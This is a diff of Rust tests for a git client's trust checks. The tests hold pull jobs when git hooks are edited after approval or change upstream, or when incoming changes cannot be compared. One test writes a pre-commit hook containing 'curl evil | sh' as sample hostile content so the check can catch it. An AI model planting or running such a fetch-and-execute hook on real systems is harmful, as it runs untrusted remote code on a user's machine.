@@ -19,26 +19,32 @@ fn prompt(st: &AppState) -> &TrustPrompt {
 
 fn trust_and_run(st: &mut AppState) -> Vec<Effect> {
     let real = real(st);
-    run(st, Msg::Trust(TrustMsg::Decide { real, trusted: true }))
+    sealed(st, Msg::Trust(TrustMsg::Decide { real, trusted: true }))
 }
 
-/// The job effect of `fx` with the check the shell pairs it with.
-fn checked_job(st: &mut AppState, fx: Vec<Effect>) -> (Effect, TrustCheck) {
-    let checks = crate::update::trust_checks(st, &fx);
-    let pair = fx.into_iter().zip(checks).find(|(e, c)| matches!(e, Effect::RunGit { .. }) && c.is_some());
-    let (effect, check) = pair.expect("a checked job");
-    (effect, check.unwrap())
+/// `run`, keeping each effect's trust check (`Effect::Checked`).
+fn sealed(st: &mut AppState, msg: Msg) -> Vec<Effect> {
+    crate::update::update_sealed(st, msg, std::time::Instant::now())
 }
 
-/// Runs the re-check the runner makes, feeding a held job back to update.
-fn recheck(st: &mut AppState, effect: Effect, check: TrustCheck) -> bool {
-    if crate::runner::trust_passes(&check) {
-        return true;
+/// The job effect of `fx`, which carries its check.
+fn checked_job(fx: Vec<Effect>) -> Effect {
+    let job = fx.into_iter().find(|e| matches!(e, Effect::Checked(c) if matches!(c.effect, Effect::RunGit { .. })));
+    job.expect("a checked job")
+}
+
+/// Runs the checked job as the runner would, feeding it back to update when it is held again:
+/// whether it ran.
+fn recheck(st: &mut AppState, job: Effect) -> bool {
+    let Effect::Checked(c) = job else { panic!("checked") };
+    let crate::effect::Checked { effect, check } = *c;
+    match crate::runner::execute_checked(check, effect).expect("a message") {
+        msg @ Msg::Trust(TrustMsg::Stale(_)) => {
+            drive(st, msg);
+            false
+        }
+        _ => true,
     }
-    let msg = crate::runner::execute_checked(check, effect).expect("a message");
-    assert!(matches!(msg, Msg::Trust(TrustMsg::Stale(_))), "held, not failed");
-    drive(st, msg);
-    false
 }
 
 fn pull() -> Msg {
@@ -52,19 +58,17 @@ fn a_hook_edited_while_the_prompt_is_open_holds_the_job_again() {
     assert!(asking(&st));
     // Edited after the prompt was drawn: Trust and run trusts what the prompt showed.
     std::fs::write(dir.join(".git/hooks/pre-commit"), "#!/bin/sh\ncurl evil | sh\n").unwrap();
-    let fx = trust_and_run(&mut st);
-    let (effect, check) = checked_job(&mut st, fx);
-    assert_eq!(check.sealed, Sealed::Job { label: "Pull".into() });
-    assert!(!recheck(&mut st, effect, check), "the edited hook isn't covered");
+    let job = checked_job(trust_and_run(&mut st));
+    assert_eq!(job.trust_check().map(|c| c.sealed.clone()), Some(Sealed::Job { label: "Pull".into() }));
+    assert!(!recheck(&mut st, job), "the edited hook isn't covered");
     assert!(st.job.is_none(), "it didn't run");
     assert_eq!(st.trust.held.as_ref().map(|h| h.job.label.as_str()), Some("Pull"), "it waits again");
     let p = prompt(&st);
     assert_eq!(p.gained.as_ref().map(|g| g.hooks.clone()), Some(vec!["pre-commit".to_owned()]), "naming the edit");
     assert!(st.held(), "the tab follows what is on disk");
     // Trusting the edited hook lets it run.
-    let fx = trust_and_run(&mut st);
-    let (effect, check) = checked_job(&mut st, fx);
-    assert!(recheck(&mut st, effect, check));
+    let job = checked_job(trust_and_run(&mut st));
+    assert!(recheck(&mut st, job));
     let _ = std::fs::remove_dir_all(&dir);
 }
 
@@ -97,24 +101,23 @@ fn a_pull_that_changes_a_tracked_hooks_folder_waits_for_trust() {
     let (mut st, work, bare) = trusted_tracked_hooks("recheck-pull");
     // A change elsewhere: the pull runs.
     remote_commit(&bare, "main", "b.txt");
-    let fx = run(&mut st, pull());
-    let (effect, check) = checked_job(&mut st, fx);
-    assert!(recheck(&mut st, effect, check), "same hooks");
+    let job = checked_job(sealed(&mut st, pull()));
+    assert!(recheck(&mut st, job), "same hooks");
     st.job = None;
     // The post-merge hook changed upstream: git would run the new one inside the pull.
     remote_commit(&bare, "main", ".githooks/post-merge");
-    let fx = run(&mut st, pull());
-    let (effect, check) = checked_job(&mut st, fx);
-    assert!(!recheck(&mut st, effect, check));
+    let head = git2::Repository::open(&work).unwrap().head().unwrap().target();
+    let job = checked_job(sealed(&mut st, pull()));
+    assert!(!recheck(&mut st, job));
+    assert_eq!(git2::Repository::open(&work).unwrap().head().unwrap().target(), head, "only the fetch ran");
     assert!(st.job.is_none(), "it didn't run");
     let p = prompt(&st);
     assert_eq!(p.held.as_deref(), Some("Pull"));
     assert_eq!(p.incoming.as_ref().map(|i| i.hooks.clone()), Some(vec!["post-merge".to_owned()]), "the incoming hook");
     assert!(!st.held(), "the repository itself is still as trusted");
     // Trusting the incoming version lets the pull run.
-    let fx = trust_and_run(&mut st);
-    let (effect, check) = checked_job(&mut st, fx);
-    assert!(recheck(&mut st, effect, check));
+    let job = checked_job(trust_and_run(&mut st));
+    assert!(recheck(&mut st, job));
     cleanup(&[&work, &bare]);
 }
 
@@ -126,21 +129,59 @@ fn a_seal_goes_with_the_effect_it_was_made_for() {
         workdir: dir.clone(),
         real: dir.clone(),
         saved: None,
-        incoming: Vec::new(),
-        prompts: false,
         sealed: Sealed::Job { label: label.into() },
+        accept_unchecked: false,
     };
     let save = || Effect::SaveRecent(Vec::new());
     let shell = || Effect::Os(crate::effect::OsEffect::OpenTerminal(dir.clone()));
-    // At its place; then, the place taken by another effect, the last effect with its name.
+    // At its place; a seal whose place another effect took checks every effect of its name,
+    // so none runs unchecked; one whose effect is gone is dropped.
     st.trust.seals.push(Seal { at: 1, name: shell().name(), check: check("a") });
     st.trust.seals.push(Seal { at: 1, name: shell().name(), check: check("b") });
     st.trust.seals.push(Seal { at: 0, name: "missing", check: check("c") });
-    let fx = [shell(), shell(), save()];
-    let paired: Vec<Option<String>> = crate::update::trust_checks(&mut st, &fx)
-        .into_iter()
-        .map(|c| c.map(|c| if let Sealed::Job { label } = c.sealed { label } else { String::new() }))
+    let mut fx = vec![shell(), shell(), save()];
+    crate::update::trust_seal_wrap(&mut st, &mut fx, 0);
+    let labels: Vec<Option<String>> = fx
+        .iter()
+        .map(|e| e.trust_check().map(|c| if let Sealed::Job { label } = &c.sealed { label.clone() } else { String::new() }))
         .collect();
-    assert_eq!(paired, [Some("b".to_owned()), Some("a".to_owned()), None]);
-    assert!(st.trust.seals.is_empty(), "each update's seals are paired once");
+    assert_eq!(labels, [Some("b".to_owned()), Some("a".to_owned()), None]);
+    assert!(st.trust.seals.is_empty(), "each update's seals are used once");
+}
+
+#[test]
+fn a_read_that_lets_git_run_carries_a_check() {
+    let mut st = super::tests::state();
+    let workdir = std::path::PathBuf::from("w");
+    let status =
+        |git_status| Effect::LoadStatus { workdir: workdir.clone(), generation: 1, submodules: false, open: None, git_status, paths: None };
+    let mut fx = vec![
+        status(true),
+        status(false),
+        Effect::VerifySignature {
+            workdir: workdir.clone(),
+            oid: git2::Oid::zero(),
+            format: glowfly_core::signing::SigningFormat::OpenPgp,
+            generation: 1,
+        },
+    ];
+    crate::update::trust_seal_wrap(&mut st, &mut fx, 0);
+    let sealed: Vec<Option<Sealed>> = fx.iter().map(|e| e.trust_check().map(|c| c.sealed.clone())).collect();
+    assert_eq!(sealed, [Some(Sealed::Read), None, Some(Sealed::Read)], "a status read by libgit2 runs nothing");
+}
+
+#[test]
+fn trust_and_run_on_a_prompt_that_couldnt_compare_runs_without_comparing() {
+    use glowfly_core::trust::incoming::Unchecked;
+    let (mut st, work, bare) = trusted_tracked_hooks("recheck-unchecked");
+    let Effect::Checked(c) = checked_job(sealed(&mut st, pull())) else { unreachable!() };
+    assert!(!c.check.accept_unchecked);
+    let now = st.snap.as_ref().unwrap().trust_scan.clone();
+    let unchecked = Some(Unchecked::TooMany(900));
+    let stale = crate::msg::Stale { check: c.check, effect: c.effect, now, incoming: None, unchecked: unchecked.clone() };
+    drive(&mut st, Msg::Trust(TrustMsg::Stale(Box::new(stale))));
+    assert_eq!(prompt(&st).unchecked.as_deref(), unchecked.as_ref(), "the prompt says why");
+    let job = checked_job(trust_and_run(&mut st));
+    assert!(job.trust_check().is_some_and(|c| c.accept_unchecked), "Trust and run takes what couldn't be compared");
+    cleanup(&[&work, &bare]);
 }
